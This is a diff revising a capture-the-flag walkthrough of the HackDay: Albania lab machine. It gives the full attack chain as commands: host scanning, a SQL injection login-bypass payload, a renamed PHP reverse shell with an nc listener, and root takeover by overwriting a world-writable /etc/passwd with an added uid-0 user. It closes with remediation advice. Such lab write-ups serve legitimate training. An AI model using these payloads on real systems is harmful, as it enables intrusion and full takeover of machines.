@@ -1,157 +1,144 @@
 # HackDay: Albania — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.127 (host-only) |
-| **Difficulty** | Beginner–Intermediate |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.127 |
+| **Difficulty** | Easy |
 | **OS** | Linux |
-| **Root Flag** | Captured (value in screenshot) |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/hackday-albania,167/) |
+| **Goal** | root flag |
+| **Source** | [HackingArticles](http://www.hackingarticles.in/hack-hackday-albania-vm-ctf-challenge/) |
 
 ## Attack Summary
 
-nmap (port 8008) → robots.txt → `/unisxcudkqjydw/vulnbank/client` → SQL injection login bypass → file upload (PHP shell as `.jpg`) → reverse shell → writable `/etc/passwd` → add root user → root
+HackDay: Albania is a beginner boot-to-root machine that chains robots.txt information disclosure, a hidden banking application discovered through enumerated paths, SQL injection authentication bypass, unrestricted file upload (extension bypass), and privilege escalation via a world-writable `/etc/passwd`. The web application runs on a non-standard port (8008), and its login page is vulnerable to a classic `OR`-based SQL injection payload.
 
 ## Methodology
 
-1. Network discovery
-2. Web enumeration on port 8008 — robots.txt analysis
-3. Bank login portal discovery
+1. Host discovery — Netdiscover
+2. Service enumeration — Nmap
+3. Web reconnaissance — robots.txt, manual path walking
 4. SQL injection authentication bypass
-5. PHP reverse shell upload via support form
-6. Privilege escalation via writable `/etc/passwd`
+5. PHP reverse shell upload (extension bypass)
+6. Shell upgrade via Python PTY
+7. Privilege escalation via writable `/etc/passwd`
 
----
-
-## Step 1: Network Discovery
+## Step 1: Host Discovery and Port Scanning
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.1.0/24
+netdiscover -r 192.168.1.0/24
 nmap -A 192.168.1.127
 ```
 
-Key findings:
-- Port 22: SSH
-- Port 8008: HTTP
+Open ports:
+- `22/tcp` — SSH
+- `8008/tcp` — HTTP
 
-![Nmap scan](images/01-nmap.png)
+![Nmap scan results](images/01-nmap.png)
 
----
+## Step 2: Web Reconnaissance
 
-## Step 2: Web Enumeration
-
-Browse to `http://192.168.1.127:8008`. The page shows a message in Albanian that roughly translates to "if I am, I know where to go :)".
-
-Check `robots.txt`:
+Navigate to `http://192.168.1.127:8008`. The page contains an HTML comment: "Ok ok, but not here." Check `robots.txt`:
 
 ```bash
 curl http://192.168.1.127:8008/robots.txt
 ```
 
-Among the 26 disallowed entries, navigate `/unisxcudkqjydw/` which links to `/vulnbank/`. Follow the path to:
+The robots file lists 26 disallowed entries. Walking through them reveals the path `/unisxcudkqjydw/`, which leads to `/unisxcudkqjydw/vulnbank/client/` — a bank login page.
 
-```
-http://192.168.1.127:8008/unisxcudkqjydw/vulnbank/client
-```
+![robots.txt and hidden path discovery](images/02-robots.png)
 
-A bank login portal appears.
+## Step 3: SQL Injection Authentication Bypass
 
-![Web enumeration](images/02-web-enum.png)
-
----
-
-## Step 3: SQL Injection — Login Bypass
-
-The login form is vulnerable to classic SQL injection:
+The login form is vulnerable to a boolean-based SQL injection. Use the following credentials:
 
 ```
 Username: ' or 'a' = 'a' --
 Password: #
 ```
 
-The query becomes:
-```sql
-SELECT * FROM users WHERE username='' or 'a'='a' --' AND password='#'
-```
+This payload makes the SQL query always evaluate to true, bypassing the password check entirely. The application logs in and presents a "Contact Support" file upload feature.
 
-Authentication succeeds and reveals a "Contact Support" page with a file upload feature.
-
-![SQLi login bypass](images/03-login-sqli.png)
-
----
+![SQL injection authentication bypass](images/03-sqli-login.png)
 
 ## Step 4: PHP Reverse Shell Upload
 
-The upload form accepts file attachments. Rename a PHP reverse shell to bypass extension filters:
+The upload feature validates file extensions but only checks for common PHP extensions. Copy and modify the Kali PHP reverse shell:
 
 ```bash
-cp /usr/share/webshells/php/php-reverse-shell.php shell.jpg
-# Edit the file: set $ip = '192.168.1.128'; $port = 1234;
+cp /usr/share/webshells/php/php-reverse-shell.php ~/shell.php
+# Edit shell.php: set $ip = '192.168.1.128' and $port = 1234
+# Rename to bypass the extension filter
+mv ~/shell.php ~/php-reverse-shell.jpg
 ```
 
-Start a listener:
+Upload `php-reverse-shell.jpg` through the form. Start a listener before triggering the shell:
 
 ```bash
 nc -lvp 1234
 ```
 
-Upload `shell.jpg` through the support form. The server executes it on upload/view.
+Trigger the uploaded file by navigating to its URL on the server.
 
-![Reverse shell](images/04-shell.png)
+![PHP reverse shell uploaded and triggered](images/04-upload-shell.png)
 
----
+## Step 5: Shell Upgrade
 
-## Step 5: Privilege Escalation — Writable `/etc/passwd`
+Once the reverse shell connects, upgrade to a proper TTY:
 
-Check `/etc/passwd` permissions:
+```bash
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+## Step 6: Privilege Escalation via Writable /etc/passwd
+
+Check file permissions:
 
 ```bash
 ls -al /etc/passwd
-# -rw-rw-rw- 1 root root ...
+# -rw-rw-rw- 1 root root ... /etc/passwd
 ```
 
-The file is world-writable. Generate a new password hash:
+The file is world-writable. Generate a new password hash on the attacker machine:
 
 ```bash
-# On attacker machine:
 openssl passwd -1 -salt ignite pass123
-# Output: $1$ignite$...
+# $1$ignite$...
 ```
 
-Serve a modified `/etc/passwd`:
+On the attacker machine, add a new root-equivalent user to a local copy of `/etc/passwd`:
 
 ```bash
-# On attacker machine:
-python3 -m http.server 80
+cp /etc/passwd ~/passwd
+echo 'raj:$1$ignite$<HASH>:0:0:root:/root:/bin/bash' >> ~/passwd
+python -m SimpleHTTPServer 80
 ```
 
-On the target:
+On the target machine:
 
 ```bash
 cd /tmp
 wget http://192.168.1.128/passwd
 cp passwd /etc/passwd
-su raj         # password: pass123
+su raj
+# Password: pass123
 cd /root
 cat flag.txt
 ```
 
-![Root access](images/05-root.png)
-
----
+![Root flag captured](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **SQL injection in login forms** — parameterized queries prevent all classic bypass payloads
-2. **File upload with weak extension filtering** — rename `.php` to `.jpg` bypasses extension checks; validate MIME type and content
-3. **World-writable `/etc/passwd`** — never allow write access to `/etc/passwd` for non-root users
-4. **Sensitive paths in robots.txt** — `robots.txt` is public; listing hidden paths aids attackers
+- SQL injection in login forms remains one of the most common and dangerous vulnerabilities. Parameterized queries or prepared statements eliminate this attack entirely.
+- File upload validation that only checks the extension is trivially bypassed by renaming the file. Content-type inspection and server-side execution controls are required.
+- A world-writable `/etc/passwd` allows any user on the system to create a root-equivalent account in seconds.
+- Hosting services on non-standard ports does not provide any meaningful security benefit if those ports are exposed.
 
 ## Remediation
 
 | Vulnerability | Fix |
 |---|---|
-| SQL injection | Use prepared statements / parameterized queries |
-| Unrestricted file upload | Validate file type by content (magic bytes), not extension |
-| Writable `/etc/passwd` | `chmod 644 /etc/passwd` and audit with `find / -perm -o+w` |
-| robots.txt information disclosure | Do not list sensitive paths in robots.txt |
+| SQL injection | Use parameterized queries / prepared statements; never interpolate user input into SQL |
+| Unrestricted file upload | Validate MIME type server-side; store uploads outside the web root; disable PHP execution in upload directories |
+| World-writable /etc/passwd | `chmod 644 /etc/passwd`; use PAM or shadow passwords; audit file permissions regularly |
+| Information disclosure via robots.txt | Do not list sensitive paths in robots.txt; rely on authentication, not obscurity |
